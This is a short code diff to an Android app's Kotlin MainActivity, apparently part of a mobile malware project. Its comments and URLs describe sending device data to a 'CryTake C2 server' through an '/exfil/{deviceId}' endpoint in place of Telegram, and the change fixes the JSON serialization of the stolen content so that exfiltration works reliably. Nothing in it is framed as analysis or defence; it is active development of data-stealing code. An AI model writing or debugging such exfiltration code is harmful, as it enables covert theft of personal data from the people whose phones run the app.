@@ -541,19 +541,16 @@ class MainActivity : FlutterActivity() {
             val deviceId = deviceChatId ?: packageName.hashCode().toString()
             
             // Send data through CryTake C2 server instead of directly to Telegram
-            // This centralizes all exfiltration through the C2 server
             Thread {
                 try {
                     val url = "$c2ServerUrl/exfil/$deviceId"
-                    val jsonData = """
-                        {
-                            "type": "$type",
-                            "content": ${org.json.JSONObject().put("x", content).toString()}",
-                            "extra": ${org.json.JSONObject().put("x", extra).toString()}
-                        }
-                    """.trimIndent()
-                    // Build JSON manually to avoid escaping issues
-                    val jsonString = "{\"type\":\"$type\",\"content\":\"${content.replace("\"", "\\\"")}\",\"extra\":\"${extra.replace("\"", "\\\"")}\"}"
+                    
+                    // Build JSON properly using JSONObject
+                    val json = org.json.JSONObject()
+                    json.put("type", type)
+                    json.put("content", content)
+                    json.put("extra", extra)
+                    val jsonString = json.toString()
                     
                     val connection = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                     connection.requestMethod = "POST"
